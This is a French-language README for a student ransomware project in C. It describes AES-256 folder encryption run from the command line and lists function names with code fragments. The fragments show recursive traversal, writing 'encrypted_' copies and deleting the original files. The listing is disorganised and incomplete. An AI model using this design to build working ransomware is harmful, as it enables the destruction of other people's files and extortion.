# Ransomware en C Documentation
Par Hugo, Sabri, Aba, Gaël et Stanley

## Introduction
Nous commencerons par préciser qu'un ransomware est un programme malveillant. Nous déconseillons de l'utiliser sans en connaitre son fonctionnement.

Ce ransomware est un programme qui a été créé dans un but éducatif. Nous révoquons toutes responsabilités quant à l'usage que vous pourriez en faire.

## Fonctionnement global du ransomware

(Etapes de fonctionnement)

### Cryptage

Nous utilisons l'algorithme de cryptage AES 256

Le ransomware fonctionne comme ceci en ligne de commande : `./ransom <path> [key]`

- path est le chemin qui pointe vers le dossier ou le fichier à chiffrer
- key est la clef qui permet de déchiffrer un dossier ou un fichier

## Compiler le programme

Nous avons réalisé le ransomware dans un environement Linux. Donc pour compiler le script nous utilisons la commande "gcc".

## Les fonctions du ransomware

`fileExists` Vérifie si un fichier existe à l'aide de diverses fonctions de la bibliothèque standard C.

`generateAESKey`

`gcc` Cette commande est utilisée pour compiler un programme en langage C à partir d'un fichier source appelé malware.c.

`#ifndef MALWARE_LIB_H`
`MALWARE_LIB_H`
`cryptFolder`
`cryptFolder(char *folder, char *keyName);`
`decryptFolder`
`int decryptFolder(char *folder, char *keyName);`

`opendir`
`opendir(folder);`
`struct`
`struct dirent* entry;`
`strcmp`
`strcmp(entry->d_name, "..") != 0 && strcmp(entry->d_name, ".") != 0 ){}`
`isFolder`
`getPath`
`appendFolder`
`(isFolder(getPath(appendFolder(folder,entry->d_name))) == 1){}`
`cryptFolder(getPath(appendFolder(folder,entry->d_name)), keyName);`
`encryptFile`
`encryptFile(appendFolder(folder,entry->d_name), appendFolder(folder,(appendFileName("encrypted_", entry->d_name))), keyName);`
`remove`
`remove(appendFolder(folder,entry->d_name));`
`closedir`
`closedir(directory);`
`readdir`
`(entry = readdir(directory)) != NULL) {}`
`strstr`
`strstr(entry->d_name, "encrypted_")`
`supStr`
`char *newName=supStr(entry->d_name, "encrypted_");`
`remove`
`remove(appendFolder(folder,entry->d_name));`
`lenStr`
`int lenStr = strlen(str);`
`lenSubStr`
`int lenSubStr = strlen(subStr);`
`const`
`const char *position = strstr(str, subStr);`
`char *newStr = malloc(lenStr - lenSubStr + 1);`
`strncpy`
`strncpy(newStr, str, position - str);`
`strcat(newStr, position + lenSubStr);`
`malloc()`
`char *copyStr = malloc(lenStr + 1);`
`int buffer = strlen(prefix) + strlen(src) + 1;`
`char *final=malloc(sizeof(char) * buffer + 1);`
`DIR* directory = opendir(path);`
`struct stat buffer;`
`helpMsg`
`void helpMsg(void)`


## Fonctions à usage plus basique

`stdio.h et stdlib.h` Ils contiennent la plupart des fonctions de base dont on a besoin dans un programme.
`#include <string.h>`
`#include <dirent.h>`
`#include <sys/stat.h>`
`#include "libSearch.h"`
`#include "crypt.h"`
`#include "malwareLib.h"`
`#include "help.h"`
`#ifndef HELP_H`
`#define HELP_H`

`main`
`int main(int argc,char** argv){ "conditions"}`
`printf`


`#define`
`#endif`
`#endif`








